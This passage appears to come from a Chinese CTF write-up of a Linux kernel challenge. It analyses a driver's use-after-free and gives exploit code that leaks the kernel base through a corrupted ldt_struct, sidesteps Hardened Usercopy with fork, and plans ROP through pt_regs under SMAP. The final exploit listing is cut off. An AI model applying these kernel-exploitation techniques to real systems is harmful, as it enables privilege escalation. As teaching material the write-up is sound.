title="题目分析"></a><strong>题目分析</strong></h4><p>接下来开始直接进行逆向分析驱动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6667</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        a2 = <span class="number">0xCC0</span>LL;</span><br><span class="line">        v8 = (<span class="keyword">unsigned</span> __int64 *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xCC0</span>LL, <span class="number">8LL</span>, v5, <span class="number">-1LL</span>);</span><br><span class="line">        buf[v3] = v8;</span><br><span class="line">        v10 = -(__int64)(v8 == <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先从0x6667这个create来看，这里的<code>kmem_cache_alloc_trace</code>函数我在源码中找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="function"><span class="keyword">void</span> *<span class="title">kmem_cache_alloc_trace</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                    <span class="keyword">gfp_t</span> flags, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line"></span><br><span class="line">    ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是这样定义的，只存在三个参数，第三个参数还是size，所以这里在ioctl中的create函数的size是固定的8字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_HIGH((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">(MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_MAXKMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_LOW5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLUB directly allocates requests fitting in to an order-1 page</span></span><br><span class="line"><span class="comment"> * (PAGE_SIZE*2).  Larger requests are passed to the page allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_HIGH(PAGE_SHIFT + 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLOB passes all requests larger than one page to the page allocator.</span></span><br><span class="line"><span class="comment"> * No kmalloc array is necessary since objects of different sizes can</span></span><br><span class="line"><span class="comment"> * be allocated from the same page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_HIGHPAGE_SHIFT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum allocatable size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MAX_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_MAX)</span></span><br><span class="line"><span class="comment">/* Maximum size for which we actually use a slab cache */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MAX_CACHE_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_HIGH)</span></span><br><span class="line"><span class="comment">/* Maximum order allocatable via the slab allocator */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MAX_ORDER(KMALLOC_SHIFT_MAX - PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里可以看到除了slab的最小的size为32，那么我们取出object也是从kmalloc-32中取出，并且可以看到slob和slub最小的size都是8。</p><p>所以虽然这里create时的size是固定的但是他申请出来的object的实际大小为32请求的大小也是32。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    note = buf[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在0x6666中实现的是将buf中的object放到另一个全局变量，note中去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6668</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v9 = buf[v3];</span><br><span class="line">        <span class="keyword">if</span> ( v9 )</span><br><span class="line">        &#123;</span><br><span class="line">            kfree(v9, a2, v4, v5, <span class="number">-1LL</span>);</span><br><span class="line">            v10 = <span class="number">0LL</span>;</span><br><span class="line">            buf[v3] = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显的就是free，并且是非常明显的UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6669</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( note )</span><br><span class="line">    &#123;</span><br><span class="line">        *note = v3;</span><br><span class="line">        v10 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是修改，但是值可以修改前8bit。这里题目其实还有一个选项，不过没什么用就不做解释了。</p><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a><strong>利用分析</strong></h4><p>相信提到这里就很清楚思路跟上面那道题基本是一致的了，因为最小size是32那也就决定了ldt_struct和seq_operations申请的size也都是32。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        addr += <span class="number">0x40000000</span>;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是单纯使用上一道题目方法的代码<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814142800527.png"                      alt="image-20220814142800527"                ></p><p>可以看到在下面搜索基地址，会直接崩溃掉，这是因为触发了Hardened Usercopy保护。在fork的系统调用中存在一条调用链：</p><p><code>sys_fork()</code>=&gt;<code>kernel_clone()</code>=&gt;<code>copy_process()</code>=&gt;<code>copy_mm()</code>=&gt;<code>dup_mm()</code>=&gt;<code>dup_mmap()</code>=&gt;<code>arch_dup_mmap()</code>=&gt;<code>ldt_dup_context()</code></p><p>最后的ldt_dup_context函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!old_mm)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">    <span class="keyword">if</span> (!old_mm-&gt;context.ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt) &#123;</span><br><span class="line">        retval = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">    finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">    retval = map_ldt_struct(mm, new_ldt, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval) &#123;</span><br><span class="line">        free_ldt_pgtables(mm);</span><br><span class="line">        free_ldt_struct(new_ldt);</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line">    mm-&gt;context.ldt = new_ldt;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    mutex_unlock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到中间存在一条memcpy函数是将父进程的ldt结构体的entries指向的内容拷贝到子进程ldt结构体的entries指针指向的位置。这样避免了把dir直接copy_to_user给用户态，这里memcpy都是在内核态进行的，所以也就避免了Hardened Usercopy保护。所以这里应该改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pipe(pipe_fd);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一步就跟刚刚一样我们要进行ROP，但是这道题恶心的地方的来了，这里开启了smap所以我们没法向上一道题目那样直接将ROP写在用户态，所以这里需要借助一个结构体pt_regs：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line">    <span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line">    <span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line">    <span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这个结构体的所有成员都是以寄存器命名的，并且内核中处理系统调用的入口函数entry_SYSCALL_64的源码中存在一条这样的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>这条指令会将所有寄存器压入进内核的栈中，形成一个pt_reg结构体：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/NwjgEMse8cTCdLr.png"                      alt="image-20220814123321832"                ></p><p>当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 rsp 与 栈底的相对偏移通常是不变的，而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们布置 ROP 链提供了可能。</p><h4 id="综上，得出exp-1"><a href="#综上，得出exp-1" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span 